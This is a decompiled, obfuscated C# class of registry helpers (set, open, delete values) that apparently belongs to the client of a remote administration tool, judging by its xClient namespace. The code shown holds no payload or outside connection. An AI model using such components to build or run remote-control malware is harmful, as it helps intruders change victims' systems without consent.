using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using Microsoft.Win32;
using xClient.Core.Registry;

public static class GClass47
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class29
	{
		public static readonly Class29 class29_0 = new Class29();

		public static Func<RegValueData, bool> func_0;

		internal bool method_0(RegValueData value)
		{
			return smethod_3(value.Name);
		}
	}

	private static string string_0 = string.Empty;

	public static bool smethod_0(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path);
			if (registryKey == null)
			{
				return false;
			}
			if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
			{
				value = "\"" + value + "\"";
			}
			registryKey.SetValue(name, value);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static RegistryKey smethod_1(RegistryHive hive, string path)
	{
		try
		{
			return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, writable: false);
		}
		catch
		{
			return null;
		}
	}

	public static bool smethod_2(RegistryHive hive, string path, string name)
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path);
			if (registryKey == null)
			{
				return false;
			}
			registryKey.DeleteValue(name, throwOnMissingValue: true);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool smethod_3(string valueName)
	{
		return string.IsNullOrEmpty(valueName);
	}

	public static RegValueData[] smethod_4(List<RegValueData> values)
	{
		if (!values.Any((RegValueData value) => smethod_3(value.Name)))
		{
			values.Add(smethod_6());
		}
		return values.ToArray();
	}

	public static RegValueData[] smethod_5()
	{
		return new RegValueData[1] { smethod_6() };
	}

	private static RegValueData smethod_6()
	{
		return new RegValueData(string_0, RegistryValueKind.String, null);
	}
}
